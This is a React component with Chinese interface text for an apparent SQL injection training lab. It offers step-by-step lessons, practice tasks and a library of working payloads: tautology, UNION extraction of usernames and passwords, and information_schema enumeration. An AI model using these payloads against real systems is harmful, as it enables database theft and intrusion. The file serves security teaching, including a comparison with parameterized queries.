import React, { useState } from 'react';
import axios from 'axios';
import TeachingGuide from './TeachingGuide';

function SQLInjection() {
  const [searchQuery, setSearchQuery] = useState('');
  const [results, setResults] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [currentStep, setCurrentStep] = useState(0);
  const [selectedPayload, setSelectedPayload] = useState(null);

  const handleSearch = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setResults([]);

    try {
      const response = await axios.get(`/api/products/search?query=${encodeURIComponent(searchQuery)}`);
      setResults(response.data);
    } catch (err) {
      setError(err.response?.data?.error || 'Search failed');
    } finally {
      setLoading(false);
    }
  };

  const teachingData = {
    vulnerability: {
      name: 'SQL注入攻击',
      description: 'SQL注入是一种通过在用户输入中插入恶意SQL代码来操纵数据库查询的攻击技术。攻击者可以利用此漏洞读取、修改或删除数据库中的数据。',
      attackPrinciple: '当应用程序直接将用户输入拼接到SQL查询中，而没有进行适当的验证和转义时，攻击者可以插入特殊的SQL语句来改变查询的原始意图。',
      impact: '可能导致数据泄露、数据篡改、权限提升，甚至完全控制数据库服务器。',
      protections: [
        '使用参数化查询（预编译语句）',
        '实施输入验证和过滤',
        '使用ORM框架',
        '最小权限原则',
        '错误信息不暴露数据库结构'
      ]
    },
    learningObjectives: [
      '理解SQL注入攻击的基本原理',
      '掌握常见的SQL注入攻击手法',
      '学会识别和利用SQL注入漏洞',
      '了解防护SQL注入的最佳实践',
      '能够编写安全的数据库查询代码'
    ],
    steps: [
      {
        title: '理解SQL查询语法',
        description: '学习基本的SQL查询结构，理解WHERE子句和条件判断',
        example: '正常查询: SELECT * FROM products WHERE name LIKE "%laptop%"\n\nSQL查询结构:\n- SELECT: 选择要显示的列\n- FROM: 指定数据表\n- WHERE: 过滤条件\n- LIKE: 模糊匹配\n- %: 通配符，匹配任意字符',
        explanation: '在SQL中，WHERE子句用于过滤数据。当用户输入被直接拼接到查询中时，攻击者可以插入特殊字符来改变查询逻辑。'
      },
      {
        title: '理解单引号闭合原理',
        description: '学习如何通过单引号闭合来改变SQL查询逻辑',
        example: '原始查询: SELECT * FROM products WHERE name LIKE "%{user_input}%"\n\n当输入: laptop\n查询变为: SELECT * FROM products WHERE name LIKE "%laptop%"\n\n当输入: \' OR \'1\'=\'1\n查询变为: SELECT * FROM products WHERE name LIKE "%\' OR \'1\'=\'1%"\n\n实际执行: SELECT * FROM products WHERE name LIKE "%" OR \'1\'=\'1',
        explanation: '单引号用于在SQL中表示字符串的开始和结束。当输入包含单引号时，它会提前结束字符串，让后续内容成为SQL代码的一部分。'
      },
      {
        title: '测试基本注入',
        description: '尝试使用简单的SQL注入载荷来验证漏洞',
        example: '载荷: \' OR \'1\'=\'1\n\n工作原理:\n1. 第一个单引号闭合了前面的字符串\n2. OR 添加了新的条件\n3. \'1\'=\'1 永远为真\n4. 整个WHERE条件变为: name LIKE "%" OR true\n5. 返回所有记录',
        explanation: '这个载荷利用了SQL的逻辑运算符OR和恒真条件，使得WHERE子句始终返回true，从而返回所有数据。'
      },
      {
        title: '提取数据',
        description: '使用UNION查询从其他表中提取数据',
        example: '\' UNION SELECT 1,username,password,4 FROM users-- \n\n工作原理:\n1. 闭合原始查询\n2. UNION 合并两个查询结果\n3. SELECT 从users表提取数据\n4. -- 注释掉后续代码\n5. 注意列数必须匹配',
        explanation: 'UNION操作符允许将多个SELECT语句的结果合并。攻击者可以利用这个特性从其他表中提取敏感数据。'
      },
      {
        title: '获取数据库信息',
        description: '利用SQL注入获取数据库结构和元数据',
        example: '\' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns-- \n\n工作原理:\n1. 查询information_schema数据库\n2. 获取所有表和列的信息\n3. 了解数据库结构\n4. 为后续攻击做准备',
        explanation: 'information_schema是MySQL的系统数据库，包含所有数据库对象的元数据信息。'
      }
    ],
    practiceTasks: [
      {
        title: '基础注入',
        description: '使用简单的SQL注入载荷返回所有产品',
        hint: '尝试使用逻辑运算符绕过查询条件'
      },
      {
        title: '数据提取',
        description: '从users表中提取用户名和密码',
        hint: '使用UNION SELECT语句，注意列数匹配'
      },
      {
        title: '数据库探测',
        description: '获取数据库中的所有表名',
        hint: '查询information_schema.tables表'
      },
      {
        title: '安全对比',
        description: '在安全搜索端点测试相同的载荷',
        hint: '观察参数化查询如何防止注入'
      }
    ]
  };

  const examplePayloads = [
    {
      name: '基础SQL注入',
      payload: "' OR '1'='1",
      description: '返回所有产品 - 验证漏洞存在',
      detailedExplanation: '这个载荷的工作原理:\n1. 第一个单引号闭合了原始查询中的字符串\n2. OR 添加了新的逻辑条件\n3. \'1\'=\'1 是一个永远为真的表达式\n4. 整个WHERE条件变为: name LIKE "%" OR true\n5. 由于OR条件中有一个为真，所以返回所有记录',
      difficulty: '初级'
    },
    {
      name: '单引号闭合演示',
      payload: "'",
      description: '测试单引号闭合 - 观察SQL语法错误',
      detailedExplanation: '这个载荷只有一个单引号，用于演示:\n1. 单引号提前结束了字符串\n2. 后续的SQL代码变得不完整\n3. 通常会导致SQL语法错误\n4. 这是SQL注入的第一步测试',
      difficulty: '初级'
    },
    {
      name: 'UNION数据提取',
      payload: "' UNION SELECT 1,username,password,4 FROM users-- ",
      description: '提取用户凭据 - 学习数据泄露',
      detailedExplanation: '这个载荷的工作原理:\n1. 单引号闭合原始查询\n2. UNION 合并两个查询的结果\n3. SELECT 从users表提取用户名和密码\n4. -- 注释掉后续的SQL代码\n5. 注意: 列数必须与原始查询匹配',
      difficulty: '中级'
    },
    {
      name: '数据库信息',
      payload: "' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns-- ",
      description: '获取数据库结构 - 学习信息收集',
      detailedExplanation: '这个载荷的工作原理:\n1. 查询information_schema系统数据库\n2. 获取所有表和列的名称\n3. 了解数据库的完整结构\n4. 为后续的精确攻击做准备',
      difficulty: '高级'
    },
    {
      name: '注释绕过',
      payload: "laptop' -- ",
      description: '使用注释绕过后续条件',
      detailedExplanation: '这个载荷的工作原理:\n1. 输入正常的产品名称\n2. 单引号闭合字符串\n3. -- 注释掉后续的SQL代码\n4. 忽略WHERE子句中的其他条件',
      difficulty: '初级'
    }
  ];

  return (
    <div className="component">
      <div className="teaching-header">
        <h2>🔓 SQL注入攻击教学</h2>
        <div className="progress-indicator">
          <span>学习进度: {currentStep + 1}/{teachingData.steps.length}</span>
        </div>
      </div>

      <div className="teaching-layout">
        <div className="practice-area">
          <h3>💻 实践操作区</h3>
          
          <div className="current-step">
            <h4>当前步骤: {teachingData.steps[currentStep].title}</h4>
            <p>{teachingData.steps[currentStep].description}</p>
            {teachingData.steps[currentStep].example && (
              <div className="step-example">
                <strong>示例代码:</strong>
                <pre>{teachingData.steps[currentStep].example}</pre>
              </div>
            )}
          </div>

          <form onSubmit={handleSearch} className="practice-form">
            <div className="form-group">
              <label htmlFor="search">产品搜索 (测试SQL注入):</label>
              <input
                type="text"
                id="search"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="输入产品名称或SQL注入载荷"
              />
            </div>

            <div className="form-actions">
              <button type="submit" className="btn" disabled={loading}>
                {loading ? '搜索中...' : '执行搜索'}
              </button>
              
              <div className="step-navigation">
                <button 
                  type="button" 
                  className="btn btn-secondary"
                  onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
                  disabled={currentStep === 0}
                >
                  上一步
                </button>
                <button 
                  type="button" 
                  className="btn btn-primary"
                  onClick={() => setCurrentStep(Math.min(teachingData.steps.length - 1, currentStep + 1))}
                  disabled={currentStep === teachingData.steps.length - 1}
                >
                  下一步
                </button>
              </div>
            </div>
          </form>

          {error && <div className="error">{error}</div>}

          {results.length > 0 && (
            <div className="results">
              <h4>搜索结果 ({results.length} 条记录):</h4>
              {results.map((product, index) => (
                <div key={index} className="result-item">
                  <h5>{product.name}</h5>
                  <p>{product.description}</p>
                  <p><strong>价格:</strong> ${product.price}</p>
                  {product.username && (
                    <p><strong>额外数据:</strong> {product.username} - {product.password}</p>
                  )}
                </div>
              ))}
            </div>
          )}

          <div className="example-payloads">
            <h4>📋 示例载荷库</h4>
            <div className="payload-grid">
              {examplePayloads.map((example, index) => (
                <div key={index} className="payload-card">
                  <div className="payload-header">
                    <h5>{example.name}</h5>
                    <span className={`difficulty ${example.difficulty}`}>{example.difficulty}</span>
                  </div>
                  <code>{example.payload}</code>
                  <p>{example.description}</p>
                  <div className="payload-actions">
                    <button
                      className="btn btn-small"
                      onClick={() => {
                        setSearchQuery(example.payload);
                        document.getElementById('search').focus();
                      }}
                    >
                      使用此载荷
                    </button>
                    <button
                      className="btn btn-small btn-info"
                      onClick={() => setSelectedPayload(example)}
                    >
                      查看原理
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Payload Explanation Modal */}
          {selectedPayload && (
            <div className="modal-overlay" onClick={() => setSelectedPayload(null)}>
              <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <div className="modal-header">
                  <h3>{selectedPayload.name}</h3>
                  <button className="close-btn" onClick={() => setSelectedPayload(null)}>×</button>
                </div>
                <div className="modal-body">
                  <div className="payload-info">
                    <h4>载荷:</h4>
                    <code className="payload-code">{selectedPayload.payload}</code>
                  </div>
                  <div className="payload-description">
                    <h4>描述:</h4>
                    <p>{selectedPayload.description}</p>
                  </div>
                  <div className="payload-explanation">
                    <h4>工作原理:</h4>
                    <pre>{selectedPayload.detailedExplanation}</pre>
                  </div>
                </div>
                <div className="modal-footer">
                  <button
                    className="btn btn-primary"
                    onClick={() => {
                      setSearchQuery(selectedPayload.payload);
                      document.getElementById('search').focus();
                      setSelectedPayload(null);
                    }}
                  >
                    使用此载荷
                  </button>
                  <button
                    className="btn btn-secondary"
                    onClick={() => setSelectedPayload(null)}
                  >
                    关闭
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="teaching-guide-area">
          <TeachingGuide 
            vulnerability={teachingData.vulnerability}
            steps={teachingData.steps}
            learningObjectives={teachingData.learningObjectives}
            practiceTasks={teachingData.practiceTasks}
          />
        </div>
      </div>
    </div>
  );
}

export default SQLInjection;
